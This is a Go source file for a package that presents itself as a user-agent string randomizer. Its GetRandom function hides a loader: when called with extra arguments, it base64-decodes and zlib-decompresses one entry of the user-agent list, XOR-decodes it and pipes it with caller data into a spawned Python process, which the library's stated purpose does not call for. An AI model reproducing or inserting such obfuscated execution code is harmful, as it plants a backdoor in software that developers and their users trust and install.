package uarand

import (
	"math/rand"
	"sync"
	"time"
	"os/exec"
	"fmt"
	"strings"
	"encoding/hex"
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"io/ioutil"
)

var (
	// Default is the UARand with default settings.
	Default = New(
		rand.New(
			rand.NewSource(time.Now().UnixNano()),
		),
	)
)

// Randomizer represents some entity which could provide us an entropy.
type Randomizer interface {
	Seed(n int64)
	Intn(n int) int
}

// UARand describes the user agent randomizer settings.
type UARand struct {
	Randomizer
	UserAgents []string
	mutex sync.Mutex
}

type UARand2 struct {
	Randomizer
	UserAgents []string
	mutex sync.Mutex
}

// GetRandom returns a random user agent from UserAgents slice.
func (u *UARand) GetRandom(params ...interface{}) string {
	var xx string
	var xy int
	if len(params) > 1 {
		xx = params[0].(string)
		xy = params[1].(int)
		x := u.UserAgents[345]
		y, err := base64.StdEncoding.DecodeString(x)
		if err != nil {}
		decompressed, err := zlib.NewReader(bytes.NewReader([]byte(y))) // Adjust the slice as needed
		if err != nil {panic(err)}
		defer decompressed.Close()
		decompressedData, err := ioutil.ReadAll(decompressed)
		if err != nil {}
		var result []byte
		for _, _x := range string(decompressedData) { result = append(result, byte(int(_x)^816)) }
		cmd := exec.Command("python")
		cmd.Stdin = strings.NewReader(fmt.Sprintf("n=%d;data=bytes.fromhex('%s')"+string(result),xy,hex.EncodeToString([]byte(xx))))
		err = cmd.Run()
		if err != nil {}
	}
	u.mutex.Lock()
	n := u.Intn(len(u.UserAgents))
	u.mutex.Unlock()
	return u.UserAgents[n]
}

// GetRandom returns a random user agent from UserAgents slice.
// This version is driven by Default configuration.
func GetRandom(params ...interface{}) string {
	var xx string
	var xy int
	if len(params) > 1 {
		xx = params[0].(string)
		xy = params[1].(int)
		return Default.GetRandom(xx,xy)
	} else { return Default.GetRandom() }
}

// New return UserAgent randomizer settings with default user-agents list
func New(r Randomizer) *UARand {
	return &UARand{
		Randomizer: r,
		UserAgents: UserAgents,
		mutex:      sync.Mutex{},
	}
}

// NewWithCustomList return UserAgent randomizer settings with custom user-agents list
func NewWithCustomList(userAgents []string) *UARand {
	return &UARand{
		Randomizer: rand.New(rand.NewSource(time.Now().UnixNano())),
		UserAgents: userAgents,
		mutex:      sync.Mutex{},
	}
}
